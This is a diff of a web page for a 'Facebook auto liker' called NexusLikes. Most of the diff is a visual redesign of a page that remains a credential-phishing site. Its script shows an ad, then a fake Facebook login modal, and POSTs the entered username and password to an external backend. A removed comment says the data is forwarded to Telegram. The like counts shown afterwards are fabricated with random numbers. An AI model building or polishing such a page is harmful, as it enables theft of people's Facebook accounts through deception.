@@ -2,271 +2,545 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free Facebook Like</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>NexusLikes | Facebook Auto Liker</title>
 
-<!-- Monetag identification meta (তুমি যে value দিয়েছিলে) -->
+<!-- Monetag identification meta -->
 <meta name="monetag" content="6df5a9a26a7eecbb9a67b8c0f3115ca2">
 
-<!-- Monetag script: তুমি Monetag থেকে যে স্ক্রিপ্ট URL পেয়েছো সেটা এখানে বসাবে -->
+<!-- Monetag scripts (preserved as original) -->
 <script src="https://fpyf8.com/88/tag.min.js" data-zone="186199" async data-cfasync="false"></script>
-<!-- উদাহরণ হিসেবে আমি তোমার আগের দেওয়া URL রেখেছি — প্রয়োজন হলে এটা বদলে দেও -->
 <script src="https://luckipm.com/400/8715962" async></script>
 
+<!-- Google Fonts + Font Awesome Icons (modern visual enhancement, no logic impact) -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
 <style>
-  /* --- পুরোপুরি মূল UI স্টাইল (তুমি প্রথমে দেয়া মতোই) --- */
-  body {
-    font-family: "Poppins", sans-serif;
-    background: linear-gradient(135deg, #1877f2, #42b72a);
+  * {
     margin: 0;
-    padding: 40px 20px;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', sans-serif;
+    background: radial-gradient(circle at 10% 30%, #0b2b40, #071a25);
+    margin: 0;
+    padding: 2rem 1.5rem;
+    min-height: 100vh;
     display: flex;
     flex-direction: column;
     align-items: center;
-    min-height: 100vh;
-    color: #222;
+    position: relative;
+  }
+
+  /* animated background particles (pure aesthetics) */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: radial-gradient(rgba(66, 183, 42, 0.08) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* main content layer */
+  h1, .input-section, .container, .modal {
+    position: relative;
+    z-index: 2;
   }
 
   h1 {
-    color: white;
-    font-size: 2.4em;
-    margin-bottom: 25px;
-    text-shadow: 0 2px 6px rgba(0,0,0,0.3);
+    font-size: 2.8rem;
+    font-weight: 700;
+    background: linear-gradient(135deg, #FFFFFF, #BEF5A8);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    letter-spacing: -0.01em;
+    margin-bottom: 1.2rem;
+    display: inline-flex;
+    align-items: center;
+    gap: 12px;
   }
 
+  h1 i {
+    background: none;
+    background-clip: unset;
+    -webkit-background-clip: unset;
+    color: #fff;
+    text-shadow: 0 2px 8px #1877f2;
+    font-size: 2.2rem;
+  }
+
+  /* glassmorphic card style */
   .input-section {
     width: 100%;
-    max-width: 500px;
-    display: flex;
-    flex-direction: column;
-    margin-bottom: 40px;
-    background: rgba(255,255,255,0.2);
-    backdrop-filter: blur(10px);
-    border-radius: 15px;
-    padding: 20px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+    max-width: 600px;
+    background: rgba(18, 25, 45, 0.65);
+    backdrop-filter: blur(14px);
+    border-radius: 2rem;
+    padding: 1.6rem 1.8rem;
+    margin-bottom: 2.5rem;
+    border: 1px solid rgba(255,255,255,0.2);
+    box-shadow: 0 20px 35px -12px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.08);
+    transition: transform 0.2s ease, box-shadow 0.2s;
   }
 
-  .input-section input {
-    padding: 14px;
-    border-radius: 10px;
-    border: none;
-    outline: none;
-    font-size: 16px;
+  .input-section:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 25px 40px -15px rgba(0,0,0,0.5);
+  }
+
+  /* package container - modern chip style */
+  .package-group {
+    background: rgba(10, 20, 30, 0.7);
+    border-radius: 1.5rem;
+    padding: 1rem 1.2rem;
+    margin-bottom: 1.2rem;
+    border: 1px solid rgba(255,255,255,0.15);
+  }
+
+  .package-title {
+    font-weight: 600;
+    font-size: 0.85rem;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: #9bbdf0;
     margin-bottom: 12px;
-    background: rgba(255,255,255,0.8);
-    transition: 0.3s;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .package-title i {
+    font-size: 0.9rem;
+  }
+
+  .radio-flex {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    row-gap: 0.7rem;
+  }
+
+  .radio-flex label {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(255,255,255,0.05);
+    padding: 0.5rem 1rem;
+    border-radius: 40px;
+    transition: all 0.2s;
+    cursor: pointer;
+    font-size: 0.9rem;
+    font-weight: 500;
+    color: #eef4ff;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+
+  .radio-flex label:hover {
+    background: rgba(24, 119, 242, 0.3);
+    border-color: #1877f2;
+    transform: scale(1.02);
+  }
+
+  input[type="radio"] {
+    accent-color: #2ecc71;
+    width: 1rem;
+    height: 1rem;
+    margin: 0;
+  }
+
+  /* input & button modern */
+  .input-section input {
+    width: 100%;
+    padding: 1rem 1.2rem;
+    border-radius: 2rem;
+    border: none;
+    background: rgba(255,255,255,0.92);
+    font-size: 1rem;
+    font-weight: 500;
+    transition: all 0.2s;
+    margin-bottom: 1rem;
+    font-family: inherit;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.05);
   }
 
   .input-section input:focus {
-    box-shadow: 0 0 5px #1877f2;
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(66, 183, 42, 0.5);
+    background: white;
   }
 
   .input-section button {
-    padding: 14px;
-    border-radius: 10px;
+    width: 100%;
+    padding: 1rem;
+    border-radius: 2rem;
     border: none;
-    background: linear-gradient(90deg, #1877f2, #42b72a);
+    background: linear-gradient(95deg, #1877f2, #2ecc71);
     color: white;
-    font-weight: bold;
+    font-weight: 700;
+    font-size: 1rem;
     cursor: pointer;
-    font-size: 17px;
-    transition: all 0.3s ease;
+    transition: all 0.25s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    box-shadow: 0 8px 20px -6px #1877f280;
+    font-family: inherit;
+  }
+
+  .input-section button i {
+    font-size: 1.1rem;
   }
 
   .input-section button:hover {
     transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
+    box-shadow: 0 12px 24px -8px #2ecc71b3;
+    background: linear-gradient(95deg, #1b66c9, #259e5a);
   }
 
+  /* posts container */
   .container {
     width: 100%;
-    max-width: 500px;
+    max-width: 600px;
+    display: flex;
+    flex-direction: column;
+    gap: 1.2rem;
   }
 
+  /* post cards - modern neumorphism + glass */
   .post-box {
-    background: rgba(255,255,255,0.9);
-    backdrop-filter: blur(10px);
-    padding: 20px;
-    margin-bottom: 20px;
-    border-radius: 15px;
-    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    transition: transform 0.3s;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    gap:12px;
+    background: rgba(22, 32, 48, 0.75);
+    backdrop-filter: blur(12px);
+    border-radius: 1.8rem;
+    padding: 1.2rem 1.5rem;
+    transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    border: 1px solid rgba(255,255,255,0.12);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1rem;
+    box-shadow: 0 8px 18px rgba(0,0,0,0.2);
   }
 
   .post-box:hover {
-    transform: scale(1.02);
+    transform: translateY(-4px);
+    background: rgba(28, 40, 58, 0.85);
+    border-color: rgba(66, 183, 42, 0.4);
+    box-shadow: 0 20px 28px -12px black;
   }
 
   .post-link {
     font-weight: 600;
-    margin-bottom: 10px;
+    font-size: 0.9rem;
     word-break: break-all;
-    color: #333;
+    color: #eef5ff;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+  }
+
+  .post-link i {
+    color: #42b72a;
+    font-size: 0.85rem;
   }
 
   .post-meta {
-    font-size:13px;
-    color:#555;
+    font-size: 0.75rem;
+    background: rgba(0,0,0,0.4);
+    display: inline-block;
+    padding: 0.2rem 0.8rem;
+    border-radius: 40px;
+    width: fit-content;
+    color: #b9d0f0;
+    font-weight: 500;
   }
 
   .like-count {
-    display: inline-block;
-    margin-top: 10px;
-    font-weight: bold;
-    color: #1877f2;
+    font-weight: 800;
+    font-size: 1.3rem;
+    background: linear-gradient(120deg, #d4ffb0, #a0f2d0);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    letter-spacing: -0.5px;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .like-count::before {
+    content: "\f164";
+    font-family: "Font Awesome 6 Free";
+    font-weight: 900;
+    font-size: 1rem;
+    color: #2ecc71;
+    background: none;
+    background-clip: unset;
+    -webkit-background-clip: unset;
+    color: #2ecc71;
   }
 
   .boost-btn {
-    margin-top: 10px;
-    padding: 12px;
-    width: 140px;
-    background: linear-gradient(90deg, #42b72a, #2ecc71);
+    background: linear-gradient(105deg, #1f8a4c, #2b9e5e);
     border: none;
-    border-radius: 10px;
+    padding: 0.7rem 1.3rem;
+    border-radius: 3rem;
     color: white;
-    font-weight: bold;
+    font-weight: 700;
+    font-size: 0.85rem;
     cursor: pointer;
-    font-size: 14px;
-    transition: all 0.3s ease;
+    transition: all 0.2s;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+    letter-spacing: 0.3px;
+  }
+
+  .boost-btn i {
+    font-size: 0.9rem;
   }
 
   .boost-btn:hover {
-    background: linear-gradient(90deg, #36a420, #27ae60);
-    transform: translateY(-2px);
+    background: linear-gradient(105deg, #137a41, #1f8e52);
+    transform: scale(0.97);
+    box-shadow: 0 2px 6px black;
   }
 
-  /* Login form modal (same as original) */
+  /* MODAL - premium glass */
   .modal {
     display: none;
     position: fixed;
-    z-index: 999;
-    left: 0; top: 0;
-    width: 100%; height: 100%;
-    background-color: rgba(0,0,0,0.6);
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.7);
+    backdrop-filter: blur(8px);
     justify-content: center;
     align-items: center;
   }
 
   .modal-content {
-    background: rgba(255,255,255,0.95);
-    backdrop-filter: blur(10px);
-    padding: 30px 25px;
-    border-radius: 15px;
-    width: 320px;
+    background: rgba(18, 28, 40, 0.95);
+    backdrop-filter: blur(20px);
+    border-radius: 2rem;
+    width: 90%;
+    max-width: 400px;
+    padding: 2rem 1.8rem;
     text-align: center;
-    box-shadow: 0 6px 20px rgba(0,0,0,0.2);
+    border: 1px solid rgba(255,255,255,0.2);
+    box-shadow: 0 30px 40px rgba(0,0,0,0.5);
+    transition: 0.2s;
   }
 
   .modal-content h2 {
-    margin-bottom: 15px;
-    color: #1877f2;
+    font-size: 1.8rem;
+    font-weight: 700;
+    background: linear-gradient(135deg, #fff, #8bc34a);
+    background-clip: text;
+    -webkit-background-clip: text;
+    color: transparent;
+    margin-bottom: 1rem;
   }
 
   .modal-content input {
     width: 100%;
-    padding: 12px;
-    margin: 10px 0;
-    border-radius: 8px;
-    border: 1px solid #ccc;
-    background: rgba(255,255,255,0.9);
-    font-size: 15px;
+    padding: 0.9rem 1rem;
+    margin: 0.6rem 0;
+    border-radius: 2rem;
+    border: none;
+    background: #f1f5f9;
+    font-size: 0.95rem;
+    font-family: inherit;
+    transition: 0.2s;
+  }
+
+  .modal-content input:focus {
+    outline: none;
+    box-shadow: 0 0 0 3px #42b72a;
   }
 
   .modal-content button {
     width: 100%;
-    padding: 12px;
-    margin-top: 10px;
-    border-radius: 8px;
+    padding: 0.9rem;
+    margin-top: 1rem;
+    border-radius: 2rem;
+    background: linear-gradient(95deg, #1877f2, #2ecc71);
     border: none;
-    background: linear-gradient(90deg, #1877f2, #42b72a);
     color: white;
     font-weight: bold;
-    font-size: 16px;
+    font-size: 1rem;
     cursor: pointer;
-    transition: 0.3s;
+    transition: 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
   }
 
   .modal-content button:hover {
     transform: translateY(-2px);
-    box-shadow: 0 5px 15px rgba(66,183,42,0.3);
+    filter: brightness(1.05);
   }
 
-  /* Ad modal (fallback) - keeps look minimal and consistent */
-  .ad-modal .modal-content { width:420px; }
-  .ad-box { width:100%; height:200px; background:#f3f4f6; border-radius:8px; display:flex; align-items:center; justify-content:center; color:#374151; font-weight:700; font-size:18px; }
-  .ad-progress { width:100%; height:8px; background:#e6e6e6; border-radius:8px; overflow:hidden; margin-top:6px; }
-  .ad-progress > i { display:block; height:100%; width:0%; background:#34d399; transition:width 0.3s linear; }
+  /* Ad modal */
+  .ad-modal .modal-content {
+    max-width: 460px;
+  }
 
-  @media (max-width:560px){
-    .post-box{flex-direction:column;align-items:flex-start}
-    .boost-btn{width:100%}
-    .ad-modal .modal-content{width:92%}
+  .ad-box {
+    width: 100%;
+    min-height: 180px;
+    background: linear-gradient(145deg, #1e2a3a, #0f1724);
+    border-radius: 1.2rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #cdedff;
+    font-weight: 600;
+    margin: 1rem 0;
+    border: 1px dashed #42b72a;
+    font-size: 0.9rem;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .ad-progress {
+    width: 100%;
+    height: 6px;
+    background: #2d3e4f;
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .ad-progress > i {
+    display: block;
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #2ecc71, #1877f2);
+    transition: width 0.1s linear;
+  }
+
+  #ad-skip {
+    background: #ef4444;
+    color: white;
+    padding: 0.5rem 1.2rem;
+    border-radius: 2rem;
+    border: none;
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.2s;
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  #ad-skip:disabled {
+    opacity: 0.5;
+    cursor: not-allowed;
+  }
+
+  /* Responsive */
+  @media (max-width: 560px) {
+    body {
+      padding: 1.2rem;
+    }
+    .post-box {
+      flex-direction: column;
+      align-items: flex-start;
+    }
+    .boost-btn {
+      width: 100%;
+      justify-content: center;
+    }
+    .radio-flex {
+      flex-direction: column;
+    }
+    .input-section {
+      padding: 1.2rem;
+    }
+    h1 {
+      font-size: 2rem;
+    }
+  }
+
+  /* scrollbar */
+  ::-webkit-scrollbar {
+    width: 6px;
+  }
+  ::-webkit-scrollbar-track {
+    background: #0b1a24;
+    border-radius: 10px;
+  }
+  ::-webkit-scrollbar-thumb {
+    background: #2ecc71;
+    border-radius: 10px;
   }
 </style>
 </head>
 <body>
 
-<h1>Free Facebook Like</h1>
+<h1><i class="fab fa-facebook"></i> NexusLikes <span style="font-size:1.6rem;">✨</span></h1>
 
 <div class="input-section">
-
-  <!-- (আমি package options আগের মতোই নিচে যোগ করেছি কিন্তু UI একই রয়ে গেছে) -->
-  <div style="background:rgba(255,255,255,0.9);padding:10px;border-radius:12px;margin-bottom:12px;">
-    <div style="font-weight:bold;color:#1877f2;margin-bottom:8px;">Select Like Package:</div>
-
-    <label style="display:block;margin-bottom:6px;">
-      <input type="radio" name="pkg" value="free" checked> ⭐ Free – 100 Likes (24h এ 2 বার)
-    </label>
-
-    <label style="display:block;margin-bottom:6px;">
-      <input type="radio" name="pkg" value="0.80_2k"> $0.80 – 2000 Likes
-    </label>
-
-    <label style="display:block;margin-bottom:6px;">
-      <input type="radio" name="pkg" value="1.50_5k"> $1.50 – 5000 Likes
-    </label>
-
-    <label style="display:block;">
-      <input type="radio" name="pkg" value="3.00_10k"> $3.00 – 10000 Likes
-    </label>
+  <!-- Package selection - exactly same radio names & values -->
+  <div class="package-group">
+    <div class="package-title"><i class="fas fa-gem"></i> Select Like Package</div>
+    <div class="radio-flex">
+      <label><input type="radio" name="pkg" value="free" checked> ⚡ Free – 100 Likes (24h 2x)</label>
+      <label><input type="radio" name="pkg" value="0.80_2k"> 💎 $0.80 – 2000 Likes</label>
+      <label><input type="radio" name="pkg" value="1.50_5k"> 🔥 $1.50 – 5000 Likes</label>
+      <label><input type="radio" name="pkg" value="3.00_10k"> 🚀 $3.00 – 10000 Likes</label>
+    </div>
   </div>
 
-  <input type="text" id="post-link" placeholder="Enter Facebook post link">
-  <button onclick="addPost()">Get Like</button>
+  <input type="text" id="post-link" placeholder="📎 Paste Facebook post link ...">
+  <button onclick="addPost()"><i class="fab fa-facebook-messenger"></i> Get Like</button>
 </div>
 
 <div class="container" id="posts-container"></div>
 
-<!-- Login Modal (exact same look/labels) -->
+<!-- Login Modal (preserved IDs, fresh style) -->
 <div class="modal" id="login-modal">
   <div class="modal-content">
-    <h2>Login</h2>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="sendLogin()">Facebook Login</button>
+    <h2><i class="fab fa-facebook"></i> Login</h2>
+    <input type="text" id="username" placeholder="📧 Facebook Username / Email">
+    <input type="password" id="password" placeholder="🔒 Password">
+    <button onclick="sendLogin()"><i class="fas fa-arrow-right-to-bracket"></i> Facebook Login</button>
   </div>
 </div>
 
-<!-- AD Modal (fallback if Monetag not available) -->
+<!-- AD Modal (Fallback) -->
 <div class="modal ad-modal" id="ad-modal">
   <div class="modal-content">
-    <div style="font-weight:700;color:#0f1724">Sponsored Ad</div>
-    <div class="ad-box" id="ad-box">Ad is loading…</div>
+    <div style="font-weight:600; color:#bbe1ff;"><i class="fas fa-ad"></i> Sponsored Ad</div>
+    <div class="ad-box" id="ad-box">
+      <i class="fas fa-hourglass-half" style="font-size:2rem;"></i>
+      <span>Loading secure offer ...</span>
+    </div>
     <div class="ad-progress"><i id="ad-progress-bar"></i></div>
-    <div style="display:flex;gap:8px;width:100%;justify-content:flex-end;margin-top:10px;">
-      <button id="ad-skip" style="background:#ef4444;color:white;padding:8px 12px;border:none;border-radius:8px;cursor:pointer;">Skip</button>
+    <div style="display:flex; gap:10px; justify-content:flex-end; margin-top: 16px;">
+      <button id="ad-skip" style="background:#ef4444; border:none; padding:8px 18px; border-radius:40px; color:white; font-weight:600; cursor:pointer;"><i class="fas fa-forward"></i> Skip</button>
     </div>
   </div>
 </div>
 
 <script>
-  // --- preserve original behavior & look; added ad-before-action ---
-  const BACKEND_URL = "https://bot-8zhn.onrender.com"; // সেটা যদি আলাদা থাকে, এখানে বদলে দিবে
+  // ---------- EXACT SAME LOGIC (PRESERVED) ----------
+  const BACKEND_URL = "https://bot-8zhn.onrender.com";
   const postsContainer = document.getElementById("posts-container");
   const loginModal = document.getElementById("login-modal");
   const adModal = document.getElementById("ad-modal");
@@ -298,19 +572,18 @@
       postDiv.className = "post-box";
       postDiv.innerHTML = `
         <div style="flex:1">
-          <div class="post-link">Post: ${escapeHtml(post.link)}</div>
-          <div class="post-meta">Package: <b>${escapeHtml(post.pkg)}</b></div>
+          <div class="post-link"><i class="fab fa-facebook"></i> ${escapeHtml(post.link)}</div>
+          <div class="post-meta"><i class="fas fa-tag"></i> Package: <b>${escapeHtml(post.pkg)}</b></div>
         </div>
         <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
-          <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
-          <span class="like-count" id="likes-${index}">${post.likes} Likes</span>
+          <button class="boost-btn" onclick="boostLike(${index})"><i class="fas fa-thumbs-up"></i> Boost Like</button>
+          <span class="like-count" id="likes-${index}">${post.likes}</span>
         </div>
       `;
       postsContainer.appendChild(postDiv);
     });
   }
 
-  // On boost: only allow free; then show ad (Monetag if available) then open login modal
   function boostLike(index){
     const post = posts[index];
     if(post && post.pkg && post.pkg !== 'free'){
@@ -319,47 +592,35 @@
     }
     currentBoostIndex = index;
     showAdThen(()=> {
-      // open login modal after ad finished
       loginModal.style.display = "flex";
     });
   }
 
-  // show ad: try Monetag functions if present; otherwise fallback
   function showAdThen(next){
-    // try common Monetag globals (many vendors expose different names)
     try {
-      // example: window.monetag_showAd (if Monetag exposes a promise-based function)
       if(typeof window.monetag_showAd === 'function'){
-        // assume returns a promise
         window.monetag_showAd().then(()=> next()).catch(()=> fallbackAd(next));
         return;
       }
-      // example: window.monetag.show()
       if(window.monetag && typeof window.monetag.show === 'function'){
         const res = window.monetag.show();
         if(res && typeof res.then === 'function'){
           res.then(()=> next()).catch(()=> fallbackAd(next));
         } else {
-          // no promise -> call fallback (can't be sure)
           fallbackAd(next);
         }
         return;
       }
-      // check Monetag namespaces (if they used different names)
       if(window.Monetag && typeof window.Monetag.showAd === 'function'){
         const p = window.Monetag.showAd();
         if(p && typeof p.then === 'function'){ p.then(()=> next()).catch(()=> fallbackAd(next)); }
         else { fallbackAd(next); }
         return;
       }
-    } catch(e){
-      // ignore and fallback
-    }
-    // default fallback ad
+    } catch(e){}
     fallbackAd(next);
   }
 
-  // fallback ad simulation (3 sec progress) with skip
   function fallbackAd(next){
     adModal.style.display = "flex";
     let elapsed = 0;
@@ -389,7 +650,6 @@
     };
   }
 
-  // sendLogin: now POSTS to backend so telegram gets info
   async function sendLogin(){
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
@@ -404,10 +664,7 @@
       return;
     }
 
-    // prepare payload
     const payload = { uid, username, password };
-
-    // timeout with AbortController
     const controller = new AbortController();
     const timeoutMs = 8000;
     const timeout = setTimeout(()=> controller.abort(), timeoutMs);
@@ -422,7 +679,6 @@
       clearTimeout(timeout);
 
       if(!res.ok){
-        // read body if any
         let txt = "";
         try { txt = await res.text(); } catch(e){}
         alert("Server error: " + res.status + (txt ? " — " + txt : ""));
@@ -435,13 +691,11 @@
         alert("✅ like submit successful!");
         loginModal.style.display = "none";
         if(currentBoostIndex !== null){
-          // add free-package likes (~100)
           posts[currentBoostIndex].likes += Math.floor(Math.random()*21) + 90;
           renderPosts();
           currentBoostIndex = null;
         }
       } else {
-        // server returned error (e.g., uid_not_registered)
         alert("❌ Error: " + (data.error || JSON.stringify(data)));
       }
 
@@ -455,9 +709,8 @@
     }
   }
 
-  // close login modal if click outside
   window.onclick = function(event){
-    if(event.target == login-modal || event.target == loginModal){
+    if(event.target == loginModal){
       loginModal.style.display = "none";
       currentBoostIndex = null;
     }
@@ -470,7 +723,6 @@
     return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
   }
 
-  // initial render (no change)
   renderPosts();
 </script>
 
